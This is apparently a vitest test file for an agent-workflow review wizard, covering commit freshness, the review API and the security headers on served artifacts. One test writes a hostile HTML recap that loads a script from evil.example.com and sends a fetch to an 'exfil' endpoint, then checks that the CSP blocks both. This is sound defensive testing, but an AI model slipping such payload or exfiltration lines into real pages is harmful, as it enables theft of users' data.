import { writeFileSync } from "node:fs";
import path from "node:path";
import { afterEach, describe, expect, test } from "vitest";
import { freshness } from "../src/server/reviews.ts";
import { git } from "./git-helpers.ts";
import { FakeGitHub } from "./github-fake.ts";
import { api, bootServer, runCleanups } from "./server-helpers.ts";
import {
  bootWorkspace,
  pushesToGitHub,
  scriptedProvider,
  waitForTicketState,
  type PhaseCall,
} from "./workflow-helpers.ts";

afterEach(runCleanups);

describe("freshness", () => {
  test("provably stale only: prefix match in either direction is fresh", () => {
    expect(freshness("abc123", "abc123")).toBe("fresh");
    expect(freshness("abc123", "abc123def456")).toBe("fresh");
    expect(freshness("abc123def456", "abc123")).toBe("fresh");
    expect(freshness("abc123", "fff999")).toBe("stale");
  });

  test("unknowable stays unknown, never a verdict", () => {
    expect(freshness(null, "abc123")).toBe("unknown");
    expect(freshness("abc123", null)).toBe("unknown");
    expect(freshness(null, null)).toBe("unknown");
    // An empty SHA must not count as "a prefix of everything".
    expect(freshness("", "abc123")).toBe("unknown");
  });
});

describe("review wizard read model (ticket 32)", () => {
  test("aggregates live wizard data and serves artifact content, contained", async () => {
    const github = new FakeGitHub();
    const calls: PhaseCall[] = [];
    const provider = scriptedProvider(calls, {
      onPhase: async (ctx) => {
        if (ctx.phase === "implement") {
          writeFileSync(path.join(ctx.cwd, "widget.txt"), "the widget\n");
          git(ctx.cwd, "add", "widget.txt");
          git(ctx.cwd, "commit", "-m", "add widget");
        }
        await pushesToGitHub(github)(ctx);
      },
    });
    const { server, ticket, repo, dataDir } = await bootWorkspace(provider, {
      github,
      repo: { testCommand: "true" },
    });
    await waitForTicketState(server, ticket.id, "human_review");

    // The review payload: ticket, the latest Run with its evidence, the PR
    // with live mergeability, and freshness from the remote branch tip.
    const review = await api(server, "GET", `/api/tickets/${ticket.id}/review`);
    expect(review.status).toBe(200);
    expect(review.json.ticket).toMatchObject({ id: ticket.id, state: "human_review" });
    expect(review.json.run).toMatchObject({ ticketId: ticket.id, state: "completed" });
    expect(review.json.run.gateResults.length).toBeGreaterThan(0);
    expect(review.json.pr).toEqual({
      number: 1,
      url: "https://github.test/pr/1",
      mergeability: "mergeable",
    });
    // Everything the run persisted rode the same worktree HEAD, which the
    // agent pushed — so the artifact SHA and the remote tip agree: fresh.
    expect(review.json.branchTip).toMatch(/^[0-9a-f]{40}$/);
    expect(review.json.artifactSha).toBe(review.json.branchTip);
    expect(review.json.freshness).toBe("fresh");

    // Artifact content is served from the blob store with defense-in-depth
    // headers: no external resource may load even if the lint missed one.
    const recap = review.json.run.artifacts.find((a: any) => a.name === "recap.html");
    expect(recap).toBeDefined();
    const res = await fetch(`${server.url}/api/artifacts/${recap.id}/content`);
    expect(res.status).toBe(200);
    expect(res.headers.get("content-type")).toBe("text/html; charset=utf-8");
    expect(res.headers.get("content-security-policy")).toContain("default-src 'none'");
    expect(res.headers.get("x-content-type-options")).toBe("nosniff");
    expect(await res.text()).toContain("What to review");

    const doc = review.json.run.artifacts.find((a: any) => a.name === "document.md");
    const mdRes = await fetch(`${server.url}/api/artifacts/${doc.id}/content`);
    expect(mdRes.headers.get("content-type")).toBe("text/markdown; charset=utf-8");
    expect(mdRes.headers.get("content-security-policy")).toContain("default-src 'none'");

    // A hostile recap (external script/img, exfiltration fetch) is served
    // byte-for-byte — the wizard renders what the agent wrote — but under a
    // CSP whose every source is inline-or-data: no directive grants the
    // network, so nothing external can load even though the lint was dodged.
    const hostile =
      '<script src="https://evil.example.com/payload.js"></script>' +
      '<img src="https://evil.example.com/pixel.png">' +
      "<script>fetch('https://evil.example.com/exfil')</script>";
    writeFileSync(path.join(dataDir, "artifacts", `run-${review.json.run.id}`, "recap.html"), hostile);
    const hostileRes = await fetch(`${server.url}/api/artifacts/${recap.id}/content`);
    expect(await hostileRes.text()).toBe(hostile);
    const csp = hostileRes.headers.get("content-security-policy")!;
    const sources = csp
      .split(";")
      .flatMap((directive) => directive.trim().split(/\s+/).slice(1));
    expect(sources.length).toBeGreaterThan(0);
    for (const source of sources) {
      expect(["'none'", "'unsafe-inline'", "data:"]).toContain(source);
    }

    // The branch moving on the remote after persist makes the evidence
    // provably stale — the only condition under which the banner may show.
    const branch = review.json.ticket.branch;
    const tree = git(repo.path, "rev-parse", `${branch}^{tree}`);
    const newTip = git(repo.path, "commit-tree", tree, "-p", branch, "-m", "later commit");
    git(repo.path, "update-ref", `refs/heads/${branch}`, newTip);
    const after = (await api(server, "GET", `/api/tickets/${ticket.id}/review`)).json;
    expect(after.branchTip).toBe(newTip);
    expect(after.freshness).toBe("stale");
  }, 20_000);

  test("degrades honestly before any run: no PR, no tip, staleness unknowable", async () => {
    const server = await bootServer();
    const project = (await api(server, "POST", "/api/projects", { name: "A" })).json;
    const ticket = (
      await api(server, "POST", "/api/tickets", {
        projectId: project.id,
        title: "Unclaimed",
        acceptanceCriteria: ["An AC"],
      })
    ).json;

    const review = await api(server, "GET", `/api/tickets/${ticket.id}/review`);
    expect(review.status).toBe(200);
    expect(review.json.run).toBeNull();
    expect(review.json.pr).toBeNull();
    expect(review.json.branchTip).toBeNull();
    expect(review.json.artifactSha).toBeNull();
    expect(review.json.freshness).toBe("unknown");

    const missing = await api(server, "GET", `/api/tickets/9999/review`);
    expect(missing.status).toBe(404);
    const noBlob = await fetch(`${server.url}/api/artifacts/9999/content`);
    expect(noBlob.status).toBe(404);
  });
});
